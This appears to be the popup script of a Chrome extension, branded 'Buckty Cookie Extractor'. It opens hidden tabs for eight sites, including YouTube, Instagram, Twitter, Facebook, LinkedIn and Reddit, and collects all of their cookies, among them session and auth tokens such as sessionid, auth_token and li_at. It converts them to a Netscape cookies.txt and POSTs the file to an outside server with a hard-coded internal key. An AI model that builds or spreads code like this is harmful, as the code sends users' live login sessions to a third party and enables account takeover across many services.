// ── Config ─────────────────────────────────────────────────────────────────

const CONFIG = {
  BACKEND_URL: "https://videosaver.online/internal/cookies",
  API_KEY: "buckty-internal-secret"
};

const PLATFORMS = {
  "YouTube":     { url: "https://www.youtube.com",  auth: ["LOGIN_INFO", "SAPISID"] },
  "Instagram":   { url: "https://www.instagram.com",            auth: ["sessionid"] },
  "Twitter":     { url: "https://twitter.com",                    auth: ["auth_token", "ct0"] },
  "TikTok":      { url: "https://www.tiktok.com",      auth: ["sessionid_ss"] },
  "Facebook":    { url: "https://www.facebook.com",             auth: ["c_user"] },
  "Dailymotion": { url: "https://www.dailymotion.com",          auth: ["sid", "tms", "access_token"] },
  "LinkedIn":    { url: "https://www.linkedin.com",        auth: ["li_at"] },
  "Reddit":      { url: "https://www.reddit.com",               auth: ["reddit_session"] },
};

// ── State ───────────────────────────────────────────────────────────────────

let lastExtractedCookies = null; // Store the last extracted cookies
let isExtracting = false;

// ── Helpers ────────────────────────────────────────────────────────────────

function log(msg) {
  const el = document.getElementById("log");
  el.classList.remove("hidden");
  el.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
  el.scrollTop = el.scrollHeight;
  console.log(msg);
}

function showStatus(html, type) {
  const el = document.getElementById("status");
  el.className = `status status-${type}`;
  el.innerHTML = html;
  el.classList.remove("hidden");
}

function toNetscapeLine(cookie) {
  // Proper Netscape format: domain\tflag\tpath\tsecure\texpires\tname\tvalue
  let domain = cookie.domain || "";
  
  // For yt-dlp compatibility, we need to handle domains properly
  // If domain starts with '.', keep it as is (subdomain wildcard)
  // If not, keep it as is (exact domain match)
  let domainPart = domain;
  let flag = "FALSE";
  
  // Check if this is a subdomain cookie (starts with .)
  if (domain.startsWith('.')) {
    flag = "TRUE";
  }
  
  const secure = cookie.secure ? "TRUE" : "FALSE";
  const expires = cookie.expirationDate ? Math.floor(cookie.expirationDate) : 0;
  const path = cookie.path || "/";
  
  // Format: domain\tflag\tpath\tsecure\texpires\tname\tvalue
  return `${domainPart}\t${flag}\t${path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}`;
}

// ── Core Logic ───────────────────────────────────────────────────────────────

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function openTab(url) {
  return new Promise((resolve) => {
    chrome.tabs.create({ url, active: false }, (tab) => {
      log(`Opened tab ${tab.id}: ${url}`);
      resolve(tab);
    });
  });
}

async function waitForTabLoad(tabId) {
  return new Promise((resolve) => {
    let loaded = false;
    
    const listener = (updatedTabId, info) => {
      if (updatedTabId === tabId && info.status === "complete") {
        loaded = true;
        chrome.tabs.onUpdated.removeListener(listener);
        log(`Tab ${tabId} fully loaded`);
        resolve();
      }
    };
    
    chrome.tabs.onUpdated.addListener(listener);
    
    // Fallback timeout (30 seconds max)
    setTimeout(() => {
      if (!loaded) {
        chrome.tabs.onUpdated.removeListener(listener);
        log(`Tab ${tabId} load timeout (proceeding anyway)`);
        resolve();
      }
    }, 30000);
  });
}

async function waitForCookies(tabId, url, platformName) {
  // Wait 10 seconds for cookies to fully set
  log(`${platformName}: waiting 10 seconds for cookies to settle...`);
  await sleep(10000);
  
  // Inject script to scroll and trigger any lazy-loaded content
  try {
    await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        window.scrollTo(0, document.body.scrollHeight / 2);
        document.body.click();
        return "scrolled and clicked";
      }
    });
    log(`${platformName}: scrolled and clicked to trigger lazy cookies`);
  } catch (e) {
    // Ignore scroll errors
  }
  
  // Wait another 3 seconds after scroll
  await sleep(3000);
  
  // Now extract cookies - get ALL cookies for the domain
  return new Promise((resolve) => {
    // Try multiple methods to get cookies
    const domain = url.replace(/^https?:\/\//, '');
    
    // Method 1: Get cookies for the specific URL
    chrome.cookies.getAll({ url }, (urlCookies) => {
      if (urlCookies && urlCookies.length > 0) {
        log(`${platformName}: got ${urlCookies.length} cookies from URL`);
        resolve(urlCookies);
        return;
      }
      
      // Method 2: Get cookies for the domain (with and without leading dot)
      chrome.cookies.getAll({ domain }, (domainCookies) => {
        if (domainCookies && domainCookies.length > 0) {
          log(`${platformName}: got ${domainCookies.length} cookies from domain`);
          resolve(domainCookies);
          return;
        }
        
        // Method 3: Try with leading dot
        chrome.cookies.getAll({ domain: `.${domain}` }, (dotDomainCookies) => {
          log(`${platformName}: got ${dotDomainCookies ? dotDomainCookies.length : 0} cookies from .domain`);
          resolve(dotDomainCookies || []);
        });
      });
    });
  });
}

async function extractPlatform(platformName, config) {
  log(`\n========== ${platformName} ==========`);
  
  // Open the platform page
  const tab = await openTab(config.url);
  
  // Wait for page to fully load
  await waitForTabLoad(tab.id);
  
  // Wait for cookies to settle
  const cookies = await waitForCookies(tab.id, config.url, platformName);
  log(`${platformName}: extracted ${cookies.length} cookies`);
  
  // Show cookie names for debugging
  const names = cookies.map(c => c.name).join(", ");
  log(`${platformName}: [${names || "No cookies found"}]`);
  
  // Close the tab
  try {
    chrome.tabs.remove(tab.id);
    log(`Closed tab ${tab.id}`);
  } catch (e) {
    log(`Tab ${tab.id} already closed`);
  }
  
  // Check auth
  const cookieNames = new Set(cookies.map(c => c.name));
  const foundAuth = config.auth.filter(a => cookieNames.has(a));
  const missingAuth = config.auth.filter(a => !cookieNames.has(a));
  
  log(`${platformName}: auth found=[${foundAuth.join(", ") || "NONE"}], missing=[${missingAuth.join(", ") || "NONE"}]`);
  
  // Special handling for Twitter - try to get auth_token from twitter.com domain
  if (platformName === "Twitter" && !cookieNames.has("auth_token")) {
    log(`${platformName}: Trying alternative method for auth_token...`);
    const twitterCookies = await new Promise((resolve) => {
      chrome.cookies.getAll({ domain: "twitter.com" }, (cookies) => {
        resolve(cookies || []);
      });
    });
    
    const authCookie = twitterCookies.find(c => c.name === "auth_token");
    if (authCookie) {
      log(`${platformName}: Found auth_token via alternative method!`);
      cookies.push(authCookie);
      // Re-check auth
      const updatedNames = new Set(cookies.map(c => c.name));
      const updatedFound = config.auth.filter(a => updatedNames.has(a));
      return {
        platform: platformName,
        cookies,
        authenticated: updatedFound.length > 0,
        found: updatedFound,
        missing: config.auth.filter(a => !updatedNames.has(a))
      };
    }
  }
  
  // Special handling for Dailymotion
  if (platformName === "Dailymotion") {
    log(`${platformName}: Checking for Dailymotion cookies...`);
    // Check all dailymotion domains
    const domains = ["dailymotion.com", ".dailymotion.com", "www.dailymotion.com"];
    let allDmCookies = [...cookies];
    
    for (const dmDomain of domains) {
      const dmCookies = await new Promise((resolve) => {
        chrome.cookies.getAll({ domain: dmDomain }, (cookies) => {
          resolve(cookies || []);
        });
      });
      allDmCookies = [...allDmCookies, ...dmCookies];
    }
    
    // Deduplicate
    const uniqueDmCookies = [];
    const seen = new Set();
    for (const c of allDmCookies) {
      const key = `${c.domain}:${c.name}`;
      if (!seen.has(key)) {
        seen.add(key);
        uniqueDmCookies.push(c);
      }
    }
    
    log(`${platformName}: Found ${uniqueDmCookies.length} unique Dailymotion cookies`);
    const dmNames = uniqueDmCookies.map(c => c.name).join(", ");
    log(`${platformName}: Dailymotion cookies: [${dmNames}]`);
    
    const dmCookieNames = new Set(uniqueDmCookies.map(c => c.name));
    const dmFoundAuth = config.auth.filter(a => dmCookieNames.has(a));
    const dmMissingAuth = config.auth.filter(a => !dmCookieNames.has(a));
    
    return {
      platform: platformName,
      cookies: uniqueDmCookies,
      authenticated: dmFoundAuth.length > 0,
      found: dmFoundAuth,
      missing: dmMissingAuth
    };
  }
  
  return {
    platform: platformName,
    cookies,
    authenticated: foundAuth.length > 0,
    found: foundAuth,
    missing: missingAuth
  };
}

function buildNetscape(allResults) {
  const lines = [
    "# Netscape HTTP Cookie File",
    "# Generated by Buckty Cookie Extractor (Chrome Extension)",
    `# Date: ${new Date().toISOString()}`,
    ""
  ];
  
  for (const result of allResults) {
    if (!result.cookies || !result.cookies.length) continue;
    
    const sep = "─".repeat(Math.max(1, 40 - result.platform.length));
    lines.push(`# ── ${result.platform} ${sep}`);
    
    // Deduplicate cookies and write in correct Netscape format
    const seen = new Set();
    let cookieCount = 0;
    for (const c of result.cookies) {
      const key = `${c.domain}:${c.name}:${c.path}`;
      if (seen.has(key)) continue;
      seen.add(key);
      const line = toNetscapeLine(c);
      lines.push(line);
      cookieCount++;
    }
    
    log(`${result.platform}: wrote ${cookieCount} unique cookies to cookies.txt`);
    lines.push("");
  }
  
  return lines.join("\n");
}

async function uploadToServer(content) {
  log(`\nUploading to ${CONFIG.BACKEND_URL}...`);
  
  try {
    const resp = await fetch(CONFIG.BACKEND_URL, {
      method: "POST",
      headers: {
        "X-Internal-Key": CONFIG.API_KEY,
        "Content-Type": "text/plain"
      },
      body: content
    });
    
    log(`Upload response: HTTP ${resp.status}`);
    return { success: resp.status === 200, status: resp.status };
  } catch (err) {
    log(`Upload error: ${err.message}`);
    return { success: false, error: err.message };
  }
}

function downloadFile(content, filename = null) {
  // Generate download with a unique ID to prevent duplicates
  const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  
  // Generate a unique filename with timestamp if not provided
  if (!filename) {
    const timestamp = new Date().getTime();
    filename = `cookies_${timestamp}.txt`;
  }
  
  // Check if chrome.downloads API is available
  if (chrome.downloads && chrome.downloads.download) {
    // Use chrome.downloads API
    chrome.downloads.download({
      url: url,
      filename: filename,
      saveAs: false,
      conflictAction: 'overwrite'
    }, (downloadId) => {
      if (chrome.runtime.lastError) {
        log(`Download error: ${chrome.runtime.lastError.message}`);
        // Fallback to manual download
        manualDownload(url, filename);
      } else {
        log(`✅ Downloaded ${filename} (ID: ${downloadId})`);
        // Clean up the object URL after download starts
        setTimeout(() => URL.revokeObjectURL(url), 1000);
      }
    });
  } else {
    // Fallback: Use manual download method
    log("chrome.downloads API not available, using fallback download method...");
    manualDownload(url, filename);
  }
}

// Fallback download method using anchor tag
function manualDownload(url, filename) {
  try {
    // Create a temporary anchor element
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    log(`✅ Downloaded ${filename} using fallback method`);
    
    // Clean up the object URL after a delay
    setTimeout(() => URL.revokeObjectURL(url), 5000);
  } catch (err) {
    log(`❌ Fallback download failed: ${err.message}`);
    // Last resort: Show the content in a new window
    showContentInNewWindow(content, filename);
  }
}

// Last resort: Show content in new window for manual copy
function showContentInNewWindow(content, filename) {
  const newWindow = window.open('', '_blank');
  if (newWindow) {
    newWindow.document.write(`
      <html>
        <head>
          <title>${filename}</title>
          <style>
            body { 
              background: #1a1a2e; 
              color: #eee; 
              font-family: monospace; 
              padding: 20px; 
              white-space: pre-wrap; 
              word-wrap: break-word;
            }
            h2 { color: #667eea; }
            .copy-btn {
              background: #667eea;
              color: white;
              border: none;
              padding: 10px 20px;
              border-radius: 5px;
              cursor: pointer;
              margin: 10px 0;
            }
            .copy-btn:hover { opacity: 0.9; }
          </style>
        </head>
        <body>
          <h2>📋 ${filename}</h2>
          <button class="copy-btn" onclick="copyContent()">📋 Copy to Clipboard</button>
          <pre id="content">${content}</pre>
          <script>
            function copyContent() {
              const content = document.getElementById('content').textContent;
              navigator.clipboard.writeText(content).then(() => {
                alert('✅ Cookies copied to clipboard!');
              }).catch(err => {
                alert('❌ Failed to copy: ' + err);
              });
            }
          <\/script>
        </body>
      </html>
    `);
    log(`✅ Opened ${filename} in new window for manual copy`);
  } else {
    log(`❌ Could not open new window. Please check popup blockers.`);
    alert('Download failed. Please check console for errors.');
  }
}

// ── UI ─────────────────────────────────────────────────────────────────────

function renderResults(results, uploadResult, downloadTriggered) {
  const listEl = document.getElementById("platformList");
  const summaryEl = document.getElementById("summary");
  
  listEl.innerHTML = "";
  
  for (const r of results) {
    const item = document.createElement("div");
    item.className = "platform-item";
    
    const icon = r.authenticated ? "✅" : "❌";
    const cls = r.authenticated ? "ok" : "fail";
    const status = r.authenticated 
      ? `auth: ${r.found.join(", ")}` 
      : `missing: ${r.missing.join(", ")}`;
    
    item.innerHTML = `
      <span class="platform-name">${icon} ${r.platform}</span>
      <span class="platform-status ${cls}">${r.cookies.length} · ${status}</span>
    `;
    listEl.appendChild(item);
  }
  
  listEl.classList.remove("hidden");
  
  const total = results.reduce((s, r) => s + r.cookies.length, 0);
  const ok = results.filter(r => r.authenticated).map(r => r.platform);
  const fail = results.filter(r => !r.authenticated).map(r => r.platform);
  
  const uploadStatus = uploadResult?.success 
    ? "✅ Uploaded" 
    : `❌ Upload failed: ${uploadResult?.error || uploadResult?.status || "Unknown"}`;
  
  const downloadStatus = downloadTriggered ? "✅ Download triggered" : "No download";
  
  summaryEl.innerHTML = `
    <strong>Summary</strong><br>
    Total: ${total} cookies<br>
    ✅ Working: ${ok.join(", ") || "None"}<br>
    ❌ Missing: ${fail.join(", ") || "None"}<br>
    ${uploadStatus}<br>
    ${downloadStatus}
  `;
  summaryEl.classList.remove("hidden");
}

// ── Main ───────────────────────────────────────────────────────────────────

async function runExtraction(download = false) {
  // Prevent multiple simultaneous extractions
  if (isExtracting) {
    log("⚠️ Extraction already in progress. Please wait.");
    return;
  }
  
  const btnExtract = document.getElementById("btnExtract");
  const btnDownload = document.getElementById("btnDownload");
  
  isExtracting = true;
  btnExtract.disabled = true;
  btnDownload.disabled = true;
  
  // Clear previous logs and status
  document.getElementById("log").innerHTML = "";
  document.getElementById("log").classList.add("hidden");
  document.getElementById("platformList").classList.add("hidden");
  document.getElementById("summary").classList.add("hidden");
  
  showStatus('<span class="spinner"></span> Opening platforms & extracting cookies (this will take ~3 minutes)...', "loading");
  log("Starting extraction process...");
  
  try {
    const results = [];
    
    // Extract each platform one by one
    for (const [name, config] of Object.entries(PLATFORMS)) {
      const result = await extractPlatform(name, config);
      results.push(result);
      
      // Small gap between platforms
      if (name !== "Reddit") {
        log("Waiting 2 seconds before next platform...");
        await sleep(2000);
      }
    }
    
    log("\n========== BUILDING cookies.txt ==========");
    const netscape = buildNetscape(results);
    
    // Store the extracted cookies for later download
    lastExtractedCookies = netscape;
    
    // Show the log
    document.getElementById("log").classList.remove("hidden");
    
    // Upload to server
    const uploadResult = await uploadToServer(netscape);
    
    // Auto-download after extraction
    const timestamp = new Date().getTime();
    downloadFile(netscape, `cookies_${timestamp}.txt`);
    const downloadTriggered = true;
    
    showStatus("✅ Extraction complete! Cookies uploaded and downloaded automatically.", "success");
    renderResults(results, uploadResult, downloadTriggered);
    
  } catch (err) {
    log(`\n❌ FATAL ERROR: ${err.message}`);
    showStatus(`❌ Error: ${err.message}`, "error");
    console.error(err);
  } finally {
    isExtracting = false;
    btnExtract.disabled = false;
    btnDownload.disabled = false;
  }
}

// ── Event Listeners ──────────────────────────────────────────────────────────

document.addEventListener("DOMContentLoaded", () => {
  const btnExtract = document.getElementById("btnExtract");
  const btnDownload = document.getElementById("btnDownload");
  
  btnExtract.addEventListener("click", () => {
    log("🔍 Extract button clicked");
    runExtraction(true); // Auto-download after extraction
  });
  
  btnDownload.addEventListener("click", () => {
    log("📥 Download button clicked");
    
    // Check if we have stored cookies from a previous extraction
    if (lastExtractedCookies) {
      log("Using previously extracted cookies...");
      const timestamp = new Date().getTime();
      downloadFile(lastExtractedCookies, `cookies_${timestamp}.txt`);
      showStatus("✅ Cookies downloaded successfully!", "success");
    } else {
      log("No previous extraction found. Running extraction with download...");
      runExtraction(true);
    }
  });
});

// ── Debug Helpers ──────────────────────────────────────────────────────────

// Log initial state
log("🚀 Popup loaded. Ready to extract cookies.");
log(`📋 Platforms configured: ${Object.keys(PLATFORMS).join(", ")}`);